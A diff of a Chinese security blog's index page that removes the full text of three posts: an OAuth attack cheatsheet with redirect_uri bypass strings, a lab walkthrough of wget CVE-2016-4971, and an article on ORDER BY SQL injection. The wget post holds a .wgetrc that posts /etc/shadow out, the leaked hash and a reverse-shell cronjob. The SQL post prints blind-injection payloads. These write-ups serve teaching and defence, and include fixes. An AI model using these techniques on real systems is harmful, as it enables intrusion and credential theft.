-<p>OAuth是一个重要的功能，他负责对访问用户敏感数据进行认证和授权。糟糕的实现OAuth是一个接管账户的可靠方式，不像XSS，它很容易利用，但是对受害者来说很难避免（NoScript不会有作用，因为这个攻击不需要JavaScript）。<br>由于OAuth，许多初创公司包括SoundCloud，Foursquare，Airbnb，About.me、Bit.ly、Pinterest、Digg，StumbleUpon，Songkick有帐户劫持漏洞。并且很多网站仍然是脆弱的。我们的动机是让人们意识到“社交登录”的风险，我们鼓励你非常小心地使用OAuth。<br>这个小抄并不会解释OAuth是怎样的工作流程，请自行去<a href="http://oauth.net" target="_blank" rel="external">官方站点</a>查看</p>
-<h1 id="授权code流"><a href="#授权code流" class="headerlink" title="授权code流"></a>授权code流</h1><h2 id="通过连接攻击者提供的服务提供商账户导致客户端账户被劫持"><a href="#通过连接攻击者提供的服务提供商账户导致客户端账户被劫持" class="headerlink" title="通过连接攻击者提供的服务提供商账户导致客户端账户被劫持"></a>通过连接攻击者提供的服务提供商账户导致客户端账户被劫持</h2><p>正如<a href="http://homakov.blogspot.hk/2012/07/saferweb-most-common-oauth2.html" target="_blank" rel="external">最常见的OAuth2漏洞</a>里面说的，换句话说就是<code>CSRF</code>。</p>
-<p>服务提供商通过重定向用户代理（译者注：浏览器）到<code>SITE/oauth/callback?code=CODE</code>来返回授权code，现在客户端必须发送授权code和客户端凭证、<code>redirect_uri</code>一起来获得<code>access_token</code></p>
-<p>如果客户端执行的时候没有使用<code>state</code>参数去减轻<code>CSRF</code>问题，我们可以很容易的使用我们的服务提供商账户连接受害者的客户端账户。</p>
-<p><img src="/images/oath-1.png" alt="oath-1"></p>
-<p>它对有社交登录和有能力为已存在的主账户添加一个登陆选项的客户端有用（下面是来自<code>pinterest.com</code>的截图）</p>
-<p><img src="/images/oath-2.png" alt="oath-2"></p>
-<p><img src="/images/oath-21.png" alt="oath-21"></p>
-<p><strong>修复：</strong>在发送用户跳转到服务提供商的请求时生成一个随机值并且保存在<code>cookie</code>或者<code>session</code>里面，当用户从服务提供商返回的时候确认你收到的<code>state</code>参数值和之前保存在<code>cookies</code>或<code>session</code>里面的那个值相等。</p>
-<p><strong>缺陷：</strong>由于<a href="https://github.com/mkdynamic/omniauth-facebook/blob/c277322722b6e8fba1eadf9de74927b73fbb86ea/lib/omniauth/strategies/facebook.rb#L105" target="_blank" rel="external">以前的代码</a>利用用户提供的<code>/connect?state=user_supplied</code>而不是生成一个随机的，所以在<a href="https://github.com/mkdynamic/omniauth-facebook/wiki/CSRF-vulnerability:-CVE-2013-4562" target="_blank" rel="external">omniauth</a>这种情况下是有可能控制固定<code>state</code>的。</p>
-<p>这是另外一个OAuth设计问题 - 有时候开发者想要使用<code>state</code>表达出自己的目的，尽管你能同时发送这样的值<code>state=welcome_landing.random_nonce</code>但是毫无疑问它看起来很丑陋，一个简洁的方案是使用<a href="https://tools.ietf.org/html/draft-bradley-oauth-jwt-encoded-state-00" target="_blank" rel="external">JSON Web Token作为state</a>。</p>
-<h2 id="服务提供商乱用固定会话导致客户端账户劫持"><a href="#服务提供商乱用固定会话导致客户端账户劫持" class="headerlink" title="服务提供商乱用固定会话导致客户端账户劫持"></a>服务提供商乱用固定会话导致客户端账户劫持</h2><p>尽管客户端合理的校验了<code>state</code>参数，我们仍然可能在服务提供商替换认证<code>cookie</code>为攻击者的账户：在登录（VK, Facebook）时候使用<code>CSRF</code>，头部注入，或者<code>cookie forcing or tossing</code>。</p>
-<p>然后我们仅仅载入一个<code>GET</code>请求触发连接（<code>omniauth中/user/auth/facebook</code>），Facebook将返回攻击者的用户信息（uid=攻击者的uid）并且它最终将连接攻击者的服务提供商账户到受害者的客户端账户。</p>
-<p><strong>修复：</strong>确保添加一个新的社交连接需要一个有效的<code>csrf_token</code>，因为这是不可能触发<code>CSRF</code>的过程。理想情况下，使用<code>POST</code>而不是<code>GET</code>。</p>
-<p>Facebook拒绝从他们那边修复登录时的<code>CSRF</code>，所以很多库仍然易受攻击。不要期望服务提供商给你可靠的认证数据。</p>
-<h2 id="泄露授权code导致账户劫持"><a href="#泄露授权code导致账户劫持" class="headerlink" title="泄露授权code导致账户劫持"></a>泄露授权code导致账户劫持</h2><p>OAuth文档很清楚的指明了服务提供商必须检查第一次的<code>redirect_uri</code>等于客户端用来获取<code>access_token</code>的<code>redirect_uri</code>。我们并没有真正的检查它因为它看起来很难出错。令人惊讶的是很多服务提供商错了：Foursquare (reported), VK (report, in Russian), Github (可能泄露私有项目的tokens), 和很多“自研”的单点登录插件。</p>
-<p>攻击方式很直接：在客户端域内找到一个漏洞页面，插入跨域图片或者一个链接到你的网站，然后使用这个页面地址作为<code>redirect_uri</code>。当受害者载入构造好的URL，它将引导受害者到<code>leaking_page?code=CODE</code>，并且受害者的用户代理将授权code暴露在http头的Referrer字段。</p>
-<p><img src="/images/auth-3.png" alt="auth-3"></p>
-<p>现在你能重新使用泄露的授权code和实际的<code>redirect_uri</code>去登录受害者账户。</p>
-<p><strong>修复：</strong>灵活的<code>redirect_uri</code>是一个不好的做法，但是，如果你需要它，那么每次请求授权code的时候存储<code>redirect_uri</code>并且在<code>access_token</code>生成的时候校验它。</p>
-<h1 id="隐式流"><a href="#隐式流" class="headerlink" title="隐式流"></a>隐式流</h1><h2 id="在打开跳转链接的时候泄露access-token-signed-request"><a href="#在打开跳转链接的时候泄露access-token-signed-request" class="headerlink" title="在打开跳转链接的时候泄露access_token/signed_request"></a>在打开跳转链接的时候泄露access_token/signed_request</h2><p>这是过去被媒体宣传为“重定向覆盖”的攻击，但事实上它已经被发现很多年了。你仅需要找到一个客户端域名或者其子域名的重定向漏洞，把该地址作为<code>redirect_uri</code>并且替换<code>response_type</code>为<code>token</code>,<code>signed_request</code>发送出去，302跳转将会保留<code>#fragment</code>，而攻击者的Javascript代码可以访问<code>location.hash</code>（即为url的<code>fragment</code>字段值）。</p>
-<p>泄露<code>access_token</code>能够被用来发送垃圾邮件和破坏你的隐私。此外，泄露的<code>signed_request</code>是更敏感的数据。通过在你完全授权用Facebook登录的客户端找到一个重定向漏洞。</p>
-<p><strong>修复：</strong>在应用的设置里仅允许一个<code>redirect_uri</code>白名单。</p>
-<p><img src="/images/auth-4.png" alt="auth-4"></p>
-<h2 id="使用攻击者的客户端发出的access-token导致账户劫持"><a href="#使用攻击者的客户端发出的access-token导致账户劫持" class="headerlink" title="使用攻击者的客户端发出的access_token导致账户劫持"></a>使用攻击者的客户端发出的access_token导致账户劫持</h2><p>也被称为<a href="http://homakov.blogspot.com/2012/08/oauth2-one-accesstoken-to-rule-them-all.html" target="_blank" rel="external">One Token to Rule Them All</a>，这个bug与移动端和客户端应用有关，因为他们经常直接使用用户提供的<code>access_token</code>。</p>
-<p>想象一下，用户有很多“授权秘钥”并且给任何他想要登录的新网站一个秘钥。一个恶意的站点管理员能够使用用户的的秘钥去登陆他的客户已经登录过的其他站点。</p>
-<p><img src="/images/auth-5.png" alt="auth-5"></p>
-<p><strong>修复：</strong> 在接受用户提供的<code>access_token</code>前检查下它是否是你的<code>client_id</code>在<code>https://graph.facebook.com/app?fields=id&amp;access_token=TOKEN</code>生成的。</p>
-<h1 id="传输和JS-SDK漏洞"><a href="#传输和JS-SDK漏洞" class="headerlink" title="传输和JS SDK漏洞"></a>传输和JS SDK漏洞</h1><p>为了更好的支持客户端应用（或者浏览器应用），一些OAuth2服务提供商添加了一些隐式流外的自定义规格变体。涉及到一个代理/中继页作为访问<code>token</code>的路由。这个代理和客户端应用的页面通讯或者通过标准的HTML5的<code>postMessage API</code>，或者使用旧的方式：指定<code>window name</code>和url（也被叫做<code>Fragment</code>传输），还有Adobe Flash的<code>LocalConnection API</code></p>
-<p>不管选择的方法是什么，确保代理呢个个仅和目标源交换信息是很重要的，不接受来自伪造的应用的页面，并且最终去确认这些客户端的检查和服务端的检查是一致的。客户端安全传输失败通常导致下面两种问题：</p>
-<ul>
-<li>泄露数据给攻击者（<a href="http://prosecco.gforge.inria.fr/CVE/Facebook_JS_2012.html" target="_blank" rel="external">授权和认证绕过</a>）</li>
-<li>信任来自攻击者的数据（<a href="https://people.eecs.berkeley.edu/~dawnsong/papers/2010%20emperors%20new%20api.pdf" target="_blank" rel="external">session固话攻击</a>）</li>
-</ul>
-<p>另外，现代web应用趋向于丰富的javascript前端库，以及不安全的客户端通讯导致超越OAuth本身的更严重的攻击。</p>
-<p><strong>修复：</strong></p>
-<ul>
-<li>完全禁用所有旧的客户端通讯方法（<code>Flash</code>或者<code>Fragment</code>），使用<code>postMessage</code></li>
-<li>检查所有进和出的消息的源，仅允许目标应用的域</li>
-<li>确保所有客户端源检查和服务端源检查一致</li>
-<li>在与另一方开始数据传输前用加密的随机数校验</li>
-</ul>
-<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>##泄露客户端凭证威胁<br>客户端凭证不再像它听起来那样重要。你唯一能做的是使用泄露的页面泄露授权code，然后手动为它们获取<code>access_token</code>（提供泄露的<code>redirect_uri</code>，而不是实际的）。尽管这个威胁当服务提供商使用静态<code>redirect_uri</code>的时候能够得到缓解。</p>
-<h2 id="session固话（OAuth1-0）"><a href="#session固话（OAuth1-0）" class="headerlink" title="session固话（OAuth1.0）"></a>session固话（OAuth1.0）</h2><p>OAuth2和OAuth1最主要的不同在于你传给服务提供商的参数。第一个版本里你发送所有的参数给服务提供商然后获取对应<code>request_token</code>。接着你引导用户到<code>provider?request_token=TOKEN</code>，然后在授权用户完后重定向返回到<code>client/callback?request_token=SAME_TOKEN</code>。</p>
-<p>在这里固话的意思是我们能欺骗用户接受我们提供的发送给我们的Token1，然后在客户端的<code>callback</code>里重用Token1</p>
-<p>这个不是严重的漏洞，因为主要是基于网络钓鱼。<a href="http://homakov.blogspot.jp/2014/01/token-fixation-in-paypal.html" target="_blank" rel="external">FYI Paypal express checkout has this bug</a></p>
-<h2 id="中间服务提供商"><a href="#中间服务提供商" class="headerlink" title="中间服务提供商"></a>中间服务提供商</h2><p>许多初创公司都用Facebook连接，与此同时，他们也是服务提供商。作为服务提供商，他们必须重定向用户到第三方站点，这些“开放的重定向”你没法修复。它使得这个链成为可能：Facebook -&gt; 中间服务提供商 -&gt; 客户端的回调，导致FB的<code>token</code>泄露。</p>
-<p>要修复这个问题，Facebook在回调URL的后面添加<code>#_=_</code>。你调用的时候应该去掉<code>fragment</code>来防止泄露。以这种方式重定向：<br><code>Location: YOUR_CLIENT/callback?code=code#</code></p>
-<h2 id="用技巧绕过redirect-uri校验"><a href="#用技巧绕过redirect-uri校验" class="headerlink" title="用技巧绕过redirect_uri校验"></a>用技巧绕过redirect_uri校验</h2><p>如果你被允许设置子目录，下面是目录遍历的技巧：</p>
-<ol>
-<li>/old/path/../../new/path</li>
-<li>/old/path/%2e%2e/%2e%2e/new/path</li>
-<li>/old/path/%252e%252e/%252e%252e/new/path</li>
-<li>/new/path///../../old/path/</li>
-<li>/old/path/.%0a./.%0d./new/path (For Rails, because it strips \n\d\0)</li>
-</ol>
-<h2 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h2><p>授权code通过<code>GET</code>发送，并将存储在日志中，服务提供商一定要在使用或过期5分钟内删除它。</p>
-<h2 id="开放的重定向泄露授权code"><a href="#开放的重定向泄露授权code" class="headerlink" title="开放的重定向泄露授权code"></a>开放的重定向泄露授权code</h2><p>通常你需要<code>referrer</code>泄露页面去泄露查询参数。这有两种通过开放的重定向来实现的技巧：</p>
-<ul>
-<li>当重定向使用<code>&lt;meta&gt;</code>标签而不是302状态和<code>Location</code>头的话，它将泄露跳转页面的<code>referrer</code>到下一个请求中。</li>
-<li>当你管理<code>redirect_uri</code>的尾部去添加<code>%23</code>（#），它将导致在<code>fragment</code>位置发送授权code<code>Location: http://CLIENT/callback/../open_redirect?to=evil#&amp;code=CODE</code></li>
-</ul>
-<h1 id="贡献者"><a href="#贡献者" class="headerlink" title="贡献者"></a>贡献者</h1><p>@homakov(<a href="https://twitter.com/homakov" target="_blank" rel="external">https://twitter.com/homakov</a>), @isciurus(<a href="https://twitter.com/isciurus" target="_blank" rel="external">https://twitter.com/isciurus</a>) and you?</p>
-<hr>
-<blockquote>
-<p>原文地址：<a href="http://www.oauthsecurity.com" target="_blank" rel="external">http://www.oauthsecurity.com</a></p>
-</blockquote>
-
+        
+          <a class="article-more-a" href="/2016/08/21/OAuth-Security-Cheatsheet/#more">more >></a>
+        
       
 
       
@@ -611,7 +542,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>GNU wget 低于1.18版本均存在任意文件上传/可能还会造成远程代码执行<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4971" target="_blank" rel="external">CVE-2016-4971</a>。当提供给wget一个恶意的url时，wget（版本低于1.18）会执行url所指向的webserver返回头中的30x跳转，造成wget会保存攻击者提供的任意远程文件。</p>
+        <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>GNU wget 低于1.18版本均存在任意文件上传/可能还会造成远程代码执行<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4971">CVE-2016-4971</a>。当提供给wget一个恶意的url时，wget（版本低于1.18）会执行url所指向的webserver返回头中的30x跳转，造成wget会保存攻击者提供的任意远程文件。</p>
 <h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><blockquote>
 <p>webserver 10.0.97.225/192.168.1.148</p>
 <p>logserver 10.0.97.243/192.168.1.149</p>
@@ -620,37 +551,9 @@
 <p><img src="/images/wget-2.png" alt="wget-2"></p>
 <p><img src="/images/wget-3.png" alt="wget-3"></p>
 <p>logserver上wget版本信息</p>
-<p><img src="/images/wget-1.png" alt="wget-1"></p>
-<p>在机器（logserver）上使用wget发起对webserver的访问，从debug信息可以看到wget在遇到30x返回码的时候是不做任何验证就去请求FTP了。</p>
-<p><img src="/images/wget-4.png" alt="wget-4"></p>
-<p>ftp的log：</p>
-<p><img src="/images/wget-5.png" alt="wget-5"></p>
-<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>webserver上的/root/.bash_profile文件就被下载到了发起wget请求的logserver上了，而wget本来是想请求下载webserver上的safe-file.txt文件的。</p>
-<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><h3 id="Cronjob"><a href="#Cronjob" class="headerlink" title="Cronjob"></a>Cronjob</h3><p>在webserver上准备好.wgetrc文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# cat .wgetrc</span><br><span class="line">post_file = /etc/shadow</span><br><span class="line">output_document = /etc/cron.d/wget-root-shell</span><br></pre></td></tr></table></figure>
-<p>假设现在有需求在服务器logserver上cron脚本每分钟去拉webserver的log文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * root wget -N http://webserver/nginx-access.log &gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p>通过cron的日志可以看到job被执行了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Jul 13 18:54:02 logserver CROND[4161]: (root) CMD (wget -N http://webserver/safe-file.txt &gt; /dev/null 2&gt;&amp;1)</span><br></pre></td></tr></table></figure>
-<p>这个job是root用户执行的，所以去root家目录下查看是否已经有.wgetrc文件了</p>
-<p><img src="/images/wget-6.png" alt="wget-6"></p>
-<p>这里有点鸡肋的是如果该目录下已经存在.wgetrc文件，那么wget下载回来的.wgetrc文件将被重命名，就没法控制目标的下载行为了。</p>
-<p>既然上传了.wgetrc文件，接下来可以再深入点，反弹个shell试试：</p>
-<p>在webserver上运行exploit-db提供的exp脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# python wget_exp.py</span><br><span class="line">Ready? Is your FTP server running?</span><br><span class="line">FTP found open on 192.168.1.148:21. Let&apos;s go then</span><br><span class="line"></span><br><span class="line">Serving wget exploit on port 80...</span><br></pre></td></tr></table></figure>
-<p>从logserver上发起到webserver的请求，此时webserver上监听的端口开始有回显</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">We have a volunteer requesting /nginx-access.log by POST :)</span><br><span class="line"></span><br><span class="line">Received POST from wget, this should be the extracted /etc/shadow file:</span><br><span class="line"></span><br><span class="line">---[begin]---</span><br><span class="line"> root:$6$t8Pjy8CmXZGtsjRL$ZG.pnIDxJasLKzHA/lVR0GPlLezD1GbqVa1b3zYndE/j8jJbXbF03X8gc9AOcVkM.ZM2EYI2G7m3jCcY3QS/C.:16524:0:99999:7:::</span><br><span class="line">bin:*:16231:0:99999:7:::</span><br><span class="line">daemon:*:16231:0:99999:7:::</span><br><span class="line">adm:*:16231:0:99999:7:::</span><br><span class="line">lp:*:16231:0:99999:7:::</span><br><span class="line">sync:*:16231:0:99999:7:::</span><br><span class="line">shutdown:*:16231:0:99999:7:::</span><br><span class="line">halt:*:16231:0:99999:7:::</span><br><span class="line">mail:*:16231:0:99999:7:::</span><br><span class="line">operator:*:16231:0:99999:7:::</span><br><span class="line">games:*:16231:0:99999:7:::</span><br><span class="line">ftp:*:16231:0:99999:7:::</span><br><span class="line">nobody:*:16231:0:99999:7:::</span><br><span class="line">dbus:!!:16524::::::</span><br><span class="line">polkitd:!!:16524::::::</span><br><span class="line">avahi:!!:16524::::::</span><br><span class="line">avahi-autoipd:!!:16524::::::</span><br><span class="line">postfix:!!:16524::::::</span><br><span class="line">sshd:!!:16524::::::</span><br><span class="line">tcpdump:!!:16535::::::</span><br><span class="line">tss:!!:16545::::::</span><br><span class="line">user01:!!:16552:0:99999:7:::</span><br><span class="line">user02:!!:16553:0:99999:7:::</span><br><span class="line">nscd:!!:16566::::::</span><br><span class="line">nslcd:!!:16566::::::</span><br><span class="line">ntp:!!:16573::::::</span><br><span class="line">saslauth:!!:16575::::::</span><br><span class="line">mailnull:!!:16575::::::</span><br><span class="line">smmsp:!!:16575::::::</span><br><span class="line">www:!!:16653:0:99999:7:::</span><br><span class="line">mysql:!!:16653::::::</span><br><span class="line">td-agent:!!:16862::::::</span><br><span class="line">systemd-bus-proxy:!!:16874::::::</span><br><span class="line">systemd-network:!!:16874::::::</span><br><span class="line">unbound:!!:16874::::::</span><br><span class="line">ocserv:!!:16874::::::</span><br><span class="line">ossec:!!:16944:0:99999:7:::</span><br><span class="line">redis:!!:16957::::::</span><br><span class="line"></span><br><span class="line">---[eof]---</span><br><span class="line"></span><br><span class="line">Sending back a cronjob script as a thank-you for the file...</span><br><span class="line">It should get saved in /etc/cron.d/wget-root-shell on the victim&apos;s host (because of .wgetrc we injected in the GET first response)</span><br><span class="line">192.168.1.149 - - [13/Jul/2016 21:30:11] &quot;POST /nginx-access.log HTTP/1.1&quot; 200 -</span><br><span class="line"></span><br><span class="line">File was served. Check on /root/hacked-via-wget on the victim&apos;s host in a minute!</span><br></pre></td></tr></table></figure>
-<p>此时，在logserver上已经被写入了cron任务，每分钟执行一次的反弹shell任务</p>
-<p><img src="/images/wget-7.png" alt="wget-7"></p>
-<p>等待一分钟，cronjob执行，反弹shell成功</p>
-<p><img src="/images/wget-8.png" alt="wget-8"></p>
-<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>官方的修复方案为在调用从FTP下载文件的函数时多传了一个原始URL参数，在生成本地文件的文件名时使用了原始的URL所带的文件名，而不是使用跳转后FTP连接中的文件名了。具体修改部分可以从<a href="https://github.com/mirror/wget/commit/e996e322ffd42aaa051602da182d03178d0f13e1" target="_blank" rel="external">commit</a>上查看到。而我们用户要做的就是升级服务器上GNU wget版本至最新或1.18以上。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我发你一个链接，你敢wget吗？</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li><a href="https://www.exploit-db.com/exploits/40064/" target="_blank" rel="external">https://www.exploit-db.com/exploits/40064/</a></li>
-<li><a href="http://blog.nsfocus.net/wget-analysis-redirection-vulnerability-technology-protection-scheme/" target="_blank" rel="external">http://blog.nsfocus.net/wget-analysis-redirection-vulnerability-technology-protection-scheme/</a></li>
-</ul>
-
+        
+          <a class="article-more-a" href="/2016/07/26/wget-redirection-vulnerability/#more">more >></a>
+        
       
 
       
@@ -713,23 +616,12 @@
       
         <p>如果问一个安全/程序员如何才能防 SQL 注入问题？我想大部分人都会提到使用参数化查询，那是不是这样就高枕无忧了呢？换句话说是不是使用参数化查询后就能杜绝一切 SQL 注入问题呢？答案是否定的，参数化查询是针对参数值的绑定技术解决注入问题，而 SQL 语句中某些字段位置并不支持绑定技术，比如 ORDER BY 关键字后跟列名。当该列名的输入对用户可控时，在 SQL 注入问题上，参数化查询就束手无策了。</p>
 <h2 id="验证漏洞"><a href="#验证漏洞" class="headerlink" title="验证漏洞"></a>验证漏洞</h2><p>查找疑似和 ORDER BY 关键字有关的参数，构造合适 Payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">orderby=ASC,if(1=1,1,(select 1 from information_schema.tables))&amp;key=value</span><br><span class="line">orderby=ASC,if(1=2,1,(select 1 from information_schema.tables))&amp;key=value</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">orderby=ASC,if(1=1,1,(select 1 from information_schema.tables))&amp;key=value</div><div class="line">orderby=ASC,if(1=2,1,(select 1 from information_schema.tables))&amp;key=value</div></pre></td></tr></table></figure>
 <p>因为 select 1 from information_schema.tables 会返回多个行，MySQL 会报“ERROR 1242 (21000): Subquery returns more than 1 row” 的错误，从而整条语句执行失败将无结果返回。</p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先看下 SELECT 语法（MySQL 5.7）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">SELECT</span><br><span class="line">    [ALL | DISTINCT | DISTINCTROW ]</span><br><span class="line">      [HIGH_PRIORITY]</span><br><span class="line">      [MAX_STATEMENT_TIME = N]</span><br><span class="line">      [STRAIGHT_JOIN]</span><br><span class="line">      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]</span><br><span class="line">      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]</span><br><span class="line">    select_expr [, select_expr ...]</span><br><span class="line">    [FROM table_references</span><br><span class="line">      [PARTITION partition_list]</span><br><span class="line">    [WHERE where_condition]</span><br><span class="line">    [GROUP BY &#123;col_name | expr | position&#125;</span><br><span class="line">      [ASC | DESC], ... [WITH ROLLUP]]</span><br><span class="line">    [HAVING where_condition]</span><br><span class="line">    [ORDER BY &#123;col_name | expr | position&#125;</span><br><span class="line">      [ASC | DESC], ...]</span><br><span class="line">    [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;]</span><br><span class="line">    [PROCEDURE procedure_name(argument_list)]</span><br><span class="line">    [INTO OUTFILE &apos;file_name&apos;</span><br><span class="line">        [CHARACTER SET charset_name]</span><br><span class="line">        export_options</span><br><span class="line">      | INTO DUMPFILE &apos;file_name&apos;</span><br><span class="line">      | INTO var_name [, var_name]]</span><br><span class="line">    [FOR UPDATE | LOCK IN SHARE MODE]]</span><br></pre></td></tr></table></figure>
-<p>可以看出一条正确 SQL 语句 ORDER BY 关键字后面可以是列名、列别名、列位置，且 ORDER BY 后面不能跟 UNION SELECT 子句，该位置的注入主要有如下姿势：</p>
-<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET parameter &apos;sort&apos; is vulnerable. Do you want to keep testing the others (if any)? [y/N]</span><br><span class="line">sqlmap identified the following injection points with a total of 46 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: sort (GET)</span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)</span><br><span class="line">    Payload: sort=1 AND (SELECT * FROM (SELECT(SLEEP(5)))kYbh)</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [security]&gt; SELECT * FROM users ORDER BY 1 AND (SELECT * FROM (SELECT(SLEEP(5)))kYbh);</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">13 rows in set (5.00 sec)</span><br></pre></td></tr></table></figure>
-<h3 id="基于布尔盲注"><a href="#基于布尔盲注" class="headerlink" title="基于布尔盲注"></a>基于布尔盲注</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET parameter &apos;sort&apos; is vulnerable. Do you want to keep testing the others (if any)? [y/N]</span><br><span class="line">sqlmap identified the following injection points with a total of 46 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: sort (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0 boolean-based blind - Parameter replace</span><br><span class="line">    Payload: sort=(SELECT (CASE WHEN (8618=8618) THEN 8618 ELSE 8618*(SELECT 8618 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
